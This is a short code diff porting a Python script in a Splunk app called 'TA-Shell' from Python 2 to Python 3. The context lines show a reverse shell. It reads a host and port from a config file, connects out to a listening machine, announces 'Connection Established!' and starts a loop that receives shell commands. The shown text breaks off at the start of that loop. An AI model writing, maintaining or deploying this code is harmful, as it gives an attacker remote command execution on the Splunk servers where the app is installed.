@@ -1,10 +1,10 @@
-#!/usr/bin/python
+#!/usr/local/bin/python3
 import socket,subprocess
-import ConfigParser
+import configparser
 import os
 
 #load configuration file
-Config = ConfigParser.ConfigParser()
+Config = configparser.ConfigParser()
 Config.read(os.environ['SPLUNK_HOME']+"/etc/apps/TA-Shell/etc/shell.conf")
 
 
@@ -31,7 +31,7 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 # connect to listening machine
 s.connect((HOST, int(PORT)))
 # send we are connected
-s.send('[*] Connection Established!\n')
+s.send(b'[*] Connection Established!\n')
 # start loop
 while 1:
      # recieve shell command
